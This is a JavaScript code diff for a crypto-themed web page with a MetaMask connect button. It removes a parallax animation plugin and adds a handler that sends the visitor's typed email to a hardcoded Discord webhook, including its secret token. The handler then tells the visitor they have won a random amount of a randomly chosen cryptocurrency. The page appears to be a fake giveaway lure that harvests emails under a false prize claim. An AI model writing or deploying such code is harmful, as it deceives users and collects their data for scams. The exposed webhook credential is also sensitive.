@@ -27,34 +27,38 @@ document.getElementById('conectarMetaMask').addEventListener('click', () => {
         console.error('MetaMask no está instalado.');
     }
 });
+document.getElementById('enviar').addEventListener('click', function() {
+    const email = document.getElementById('email').value;
+    const cryptoOptions = ['BTC', 'TRX', 'BNB', 'ETH', 'SHIB', 'DOGE', 'MATIC', 'USDT', 'BUSD'];
+    const randomCrypto = cryptoOptions[Math.floor(Math.random() * cryptoOptions.length)];
+    const randomValue = [5, 7, 12, 15, 18, 23][Math.floor(Math.random() * 6)];
 
-(function($) {
-	$.fn.extend({
-		jParallax: function(opt) {
-			var defaults = { moveFactor: 5, targetContainer: 'body' },
-				o = $.extend(defaults, opt);
-			return this.each(function() {
-				var background = $(this);
-				$(o.targetContainer).on('mousemove', function(e){
-					mouseX = e.pageX;
-					mouseY = e.pageY;
-					windowWidth = $(window).width();
-					windowHeight = $(window).height();
-					percentX = (0-((mouseX/windowWidth)*o.moveFactor) - (o.moveFactor/2)+o.moveFactor)/2;
-					percentY = (0-((mouseY/windowHeight)*o.moveFactor) - (o.moveFactor/2)+o.moveFactor)/2;
-					background[0].style.transform = "translate("+percentX+"%,"+percentY+"%)";
-				});
-			});
-		}					
-	});
-}(jQuery));
-/*END PLUGIN jParallax*/
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-'; // Reemplazar con el URL de tu webhook de Discord
 
-/*Invoke*/
-$('.bg1').jParallax({ moveFactor: 5, targetContainer: '.parallax' });
+    const data = {
+        content: `¡Felicidades! Has ganado ${randomValue} USD en ${randomCrypto.toUpperCase()} 🎉`,
+        embeds: [
+            {
+                title: 'Correo Electrónico Ganador',
+                description: email,
+                color: 16776960 
+            }
+        ]
+    };
 
-$('.bg2').jParallax({ moveFactor: 10, targetContainer: '.parallax' });
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(() => {
+        const alertBox = document.getElementById('alertBox');
+        alertBox.textContent = '¡Has ganado!';
+        alertBox.style.display = 'block';
+    })
+    .catch(error => console.error('Error:', error));
+});
 
-$('.bg3').jParallax({ moveFactor: 15, targetContainer: '.parallax' });
-
-$('.bg4').jParallax({ moveFactor: 20, targetContainer: '.parallax' });
